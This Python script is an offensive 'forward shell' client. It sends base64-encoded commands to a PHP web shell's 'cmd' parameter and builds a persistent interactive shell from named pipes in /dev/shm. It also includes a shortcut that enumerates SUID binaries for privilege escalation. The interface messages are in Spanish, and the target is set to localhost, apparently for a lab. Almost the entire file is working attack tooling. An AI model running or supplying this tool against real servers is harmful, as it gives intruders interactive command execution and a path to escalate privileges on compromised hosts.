#!/usr/bin/env python3

import requests
import time
from termcolor import colored
from base64 import b64encode
from random import randrange


class ForwardShell():

  def __init__(self):
    session = randrange(1000,9999)
    self.main_url = "http://localhost/index.php"

    self.stdin= f"/dev/shm/{session}.input"
    self.stdout= f"/dev/shm/{session}.output"
    self.help_options = {'enum suid': 'FileSystem SUID Privileges Enumeration', 'help': 'Show this help pannel'}
    self.is_pseudo_terminal=False


  def run_command(self, command):

    command = b64encode(command.encode()).decode()

    data = {
      'cmd' : 'echo "%s" | base64 -d | /bin/sh' %command
    }

    try:
      r= requests.get(self.main_url,params=data, timeout=5)
      return r.text
    except:
      pass


  def write_stdin(self, command):

    command= b64encode(command.encode()).decode()

    data ={
      'cmd': 'echo "%s" | base64 -d > %s' % (command, self.stdin)
    }

    requests.get(self.main_url, params=data)


  def read_stdout(self):

    for _ in range(5):
      read_stdout_command = f"/bin/cat {self.stdout}"
      output_command=self.run_command(read_stdout_command)
      time.sleep(0.2)

    return output_command

  def setup_shell(self):

    command = f"mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (self.stdin,self.stdin,self.stdout)
    self.run_command(command)

  def remove_data(self):
    remove_data_command= f"/bin/rm {self.stdin} {self.stdout}"
    self.run_command(remove_data_command)


  def clear_stdout(self):
    clear_stdout_command= f"echo '' > {self.stdout}"
    self.run_command(clear_stdout_command)


  def run(self):

    self.setup_shell()

    while True:
      command = input(colored(" NoC >> ", "yellow"))

      if "script /dev/null -c bash" in command:
        print(colored(f"\n[+] Se ha iniciado una pseudo-terminal\n", "blue"))
        self.is_pseudo_terminal = True

      if command.strip() == "enum suid":
        command = f"find / -perm -4000 2>/dev/null | xargs ls -l"

      if command.strip() == "help":
        print(colored(f"\n[+] Listando panel de ayuda:\n", "yellow"))

        for key,value in self.help_options.items():
          print(f"\t{key} - {value}")

        print("\n")
        continue

      self.write_stdin(command + "\n")
      output_command= self.read_stdout()

      if command.strip()== "exit":
        self.is_pseudo_terminal = False
        print(colored(f"\n[!] Se ha salido de la pseudo-terminal\n", "red"))
        self.clear_stdout()
        continue

      if self.is_pseudo_terminal:
        lines = output_command.split('\n')

        if len(lines) == 3:
          cleared_output = '\n'.join([lines[-1]] + lines[:1])
        elif len(lines) > 3:
          cleared_output = '\n'.join([lines[-1]] + lines[:1] + lines[2:-1])

        print("\n"+ cleared_output + "\n")

      else:
        print(output_command)

      self.clear_stdout()
